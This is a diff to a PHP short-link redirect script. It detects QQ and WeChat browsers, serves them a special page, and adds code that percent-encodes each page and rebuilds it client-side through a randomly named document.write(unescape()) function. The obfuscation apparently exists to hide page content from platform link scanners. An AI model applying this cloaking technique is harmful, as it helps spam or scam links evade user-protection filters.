@@ -99,13 +99,14 @@ if(!empty($_GET['d'])){
 if(!empty($_GET['igfw'])){
     preg_match('/^[a-zA-z0-9\.\-\/]{1,}$/', $_GET['igfw'], $id);
     $igfw = getTxt($id[0]);
+    $get_rand = str_rand();
     if(!empty($igfw[0])&&$igfw[0]==$_GET['igfw']){
         if(!empty($_POST['pass'])){
             exit('<html><head><meta http-equiv="Content-Language" content="zh-CN"><meta HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8"><script>window.location.replace(\'http://'.trim($igfw[2]).'/'.(trim($igfw[2])=='m.baidu.com'?'s':'').'?ie=utf-8&word=site%3A'.(trim($igfw[2])=='m.baidu.com'?$_SERVER['HTTP_HOST']:getHttpType().$_SERVER['HTTP_HOST'].'/'.trim($igfw[0])).'\');</script><meta http-equiv="refresh" content="0.1;url=http://'.trim($igfw[2]).'/'.(trim($igfw[2])=='m.baidu.com'?'s':'').'?ie=utf-8&word=site%3A'.(trim($igfw[2])=='m.baidu.com'?$_SERVER['HTTP_HOST']:getHttpType().$_SERVER['HTTP_HOST'].'/'.trim($igfw[0])).'"><title></title></head><body></body></html>');
         }
         if(strpos($_SERVER['HTTP_USER_AGENT'], 'QQ/')||strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger')!==false) {
             $siteurl = getHttpType().$_SERVER['HTTP_HOST'].'/'.trim($igfw[0]);
-            exit('<!DOCTYPE HTML>
+            exit('<script>function '.$get_rand.'('.$get_rand.'){document.write((unescape('.$get_rand.')));};'.$get_rand.'("'.escape('<!DOCTYPE HTML>
 <html>
 <head>
   <meta charset="UTF-8">
@@ -180,9 +181,9 @@ if(navigator.userAgent.indexOf("QQ/")> -1){
     }
 }
 </script>
-</html>'); 
+</html>').'".replace(/ /g,"%"));</script>'); 
     } else {
-        exit('<!DOCTYPE HTML>
+        exit('<script>function '.$get_rand.'('.$get_rand.'){document.write((unescape('.$get_rand.')));};'.$get_rand.'("'.escape('<!DOCTYPE HTML>
 <html lang="en-US">
 <head>
   <meta charset="UTF-8" />
@@ -280,7 +281,7 @@ if(navigator.userAgent.indexOf("QQ/")> -1){
     </tr>
   </table>
 </body>
-</html>');
+</html>').'".replace(/ /g,"%"));</script>');
         }
     }
 }
@@ -343,6 +344,32 @@ function getFileAll() {
     } else {
         exit('暂无短地址');
     }
+}
+
+function escape($string, $in_encoding = 'UTF-8',$out_encoding = 'UCS-2') {
+    $return = '';
+    if (function_exists('mb_get_info')) {
+        for($x = 0; $x<mb_strlen($string, $in_encoding); $x++) {
+            $str = mb_substr($string, $x, 1, $in_encoding);
+            if (strlen($str)>1) { // 多字节字符
+                $return .= '%'.'u' . strtoupper(bin2hex(mb_convert_encoding($str, $out_encoding, $in_encoding)));
+            } else {
+                $return .= '%' . strtoupper(bin2hex($str));
+            }
+        }
+    }
+    return str_replace('%', ' ', $return);
+}
+
+function str_rand($length = 32, $char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') {
+    if(!is_int($length) || $length < 0) {
+        return false;
+    }
+    $string = '';
+    for($i = $length; $i > 0; $i--) {
+        $string .= $char[mt_rand(0, strlen($char) - 1)];
+    }
+    return $string;
 }
 
 /**
